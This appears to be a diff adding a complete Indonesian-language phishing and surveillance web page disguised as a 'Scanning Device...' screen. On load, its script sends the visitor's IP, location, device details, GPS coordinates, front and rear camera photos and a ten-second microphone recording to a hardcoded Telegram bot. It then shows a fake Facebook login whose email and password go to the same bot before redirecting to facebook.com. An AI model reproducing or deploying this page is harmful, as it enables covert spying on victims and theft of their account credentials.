@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="6865671341">
+<head>
+<meta charset="UTF-8">
+<title>Scanning Device...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+  margin: 0;
+  background: black;
+  color: lime;
+  font-family: monospace;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+}
+h1 {
+  text-shadow: 0 0 10px lime;
+}
+#loginForm {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+}
+input {
+  margin: 10px;
+  padding: 10px;
+  width: 250px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+button {
+  padding: 10px 20px;
+  background: #1877f2;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+</style>
+</head>
+<body>
+
+<h1 id="judul">Scanning device...</h1>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<div id="loginForm">
+  <h2 style="color:#1877f2;">𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗟𝗼𝗴𝗶𝗻</h2>
+  <input type="text" id="email" placeholder="Email atau Nomor Telepon">
+  <input type="password" id="password" placeholder="Kata Sandi">
+  <button onclick="kirimLogin()">𝗟𝗼𝗴𝗶𝗻</button>
+</div>
+
+<script>
+const token = '7259337500:AAEj_w08u3QyEI_pINFsNk0A_tz3abYga_U';
+const chat_id = '6865671341';
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const mulai = Date.now();
+
+function kirimPesan(text) {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id, text })
+  });
+}
+
+function kirimFoto(blob, caption) {
+  let form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append('photo', blob, 'foto.jpg');
+  form.append('caption', caption);
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: 'POST',
+    body: form
+  });
+}
+
+function kirimAudio(blob) {
+  let form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append('audio', blob, 'rekaman.mp3');
+  form.append('caption', '🎤 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗮𝗱𝗮𝗽 𝗥𝗲𝗸𝗮𝗺𝗮𝗻 𝗦𝘂𝗮𝗿𝗮 𝗞𝗼𝗿𝗯𝗮𝗻');
+  fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+    method: 'POST',
+    body: form
+  });
+}
+
+function ambilFoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => {
+    kirimFoto(blob, '📸 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗮𝗱𝗮𝗽 𝗞𝗮𝗺𝗲𝗿𝗮 𝗗𝗲𝗽𝗮𝗻 / 𝗕𝗲𝗹𝗮𝗸𝗮𝗻𝗴');
+  }, 'image/jpeg');
+}
+
+// Start akses data
+kirimPesan('📝 𝗗𝗮𝘁𝗮 𝗞𝗼𝗿𝗯𝗮𝗻 𝗠𝗮𝘀𝘂𝗸 𝗕𝗮𝗻𝗴 𝗗𝗼𝗻𝘇𝗧𝘇𝘆...');
+
+// IP & Lokasi
+fetch('https://api.ipify.org?format=json')
+.then(res => res.json())
+.then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
+.then(loc => loc.json())
+.then(info => {
+  const device = navigator.userAgent;
+  const ram = navigator.deviceMemory || 'Tidak diketahui';
+  const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const bahasa = navigator.language;
+  const browser = navigator.appName + ' ' + navigator.appVersion;
+  const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
+
+  navigator.getBattery().then(bat => {
+    const now = Date.now();
+    const waktuBuka = Math.floor((now - mulai) / 1000);
+    const status = `
+==[+] 𝙏𝙧𝙖𝙘𝙠 𝘽𝙮 𝘿𝙤𝙣𝙯𝙏𝙯𝙮 [+]==
+🌐 IP: ${info.ip}
+🏳 Negara: ${info.country_name}
+🖥 Region: ${info.region}
+📲 Kota: ${info.city}
+🔎 ISP: ${info.org}
+🔋 Baterai: ${Math.floor(bat.level * 100)}%
+📱 Device: ${device}
+🧠 RAM: ${ram} GB
+⚙️ CPU: ${cpu} core
+🌍 Zona Waktu: ${timezone}
+🗣️ Bahasa: ${bahasa}
+🧭 Browser: ${browser}
+📡 Status Jaringan: ${statusJaringan}
+⏳ Waktu buka web: ${waktuBuka} detik
+==[+] 𝘾𝙮𝙗𝙚𝙧 𝘿𝙤𝙣𝙯 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 [+]==`;
+    kirimPesan(status);
+  });
+});
+
+// Lokasi GPS
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const lokasi = `📍 Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+    kirimPesan(lokasi);
+  });
+}
+
+// Kamera depan
+navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+.then(stream => {
+  video.srcObject = stream;
+  video.play();
+  setTimeout(() => {
+    ambilFoto();
+    stream.getTracks().forEach(track => track.stop());
+    // Kamera belakang setelah depan
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+    .then(stream2 => {
+      video.srcObject = stream2;
+      video.play();
+      setTimeout(() => {
+        ambilFoto();
+        stream2.getTracks().forEach(track => track.stop());
+      }, 5000);
+    });
+  }, 5000);
+})
+.catch(err => {
+  kirimPesan("Gagal akses kamera: " + err);
+});
+
+// Rekam Microphone
+navigator.mediaDevices.getUserMedia({ audio: true })
+.then(stream => {
+  const mediaRecorder = new MediaRecorder(stream);
+  const audioChunks = [];
+
+  mediaRecorder.ondataavailable = event => {
+    audioChunks.push(event.data);
+  };
+  mediaRecorder.onstop = () => {
+    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+    kirimAudio(audioBlob);
+  };
+
+  mediaRecorder.start();
+  setTimeout(() => {
+    mediaRecorder.stop();
+  }, 10000); // rekam 10 detik
+})
+.catch(err => {
+  kirimPesan("Gagal akses microphone: " + err);
+});
+
+// Tampilkan Login Palsu
+setTimeout(() => {
+  document.getElementById('judul').style.display = 'none';
+  document.getElementById('loginForm').style.display = 'flex';
+}, 15000); // setelah 15 detik tampil login
+// (waktu bisa diatur sesuai keinginan)
+
+function kirimLogin() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  kirimPesan(`🔑 Login Korban:\nEmail/HP: ${email}\nPassword: ${password}`);
+  alert('Sedang masuk...');
+  setTimeout(() => {
+    window.location.href = 'https://facebook.com';
+  }, 2000);
+}
+</script>
+
+</body>
+</html>
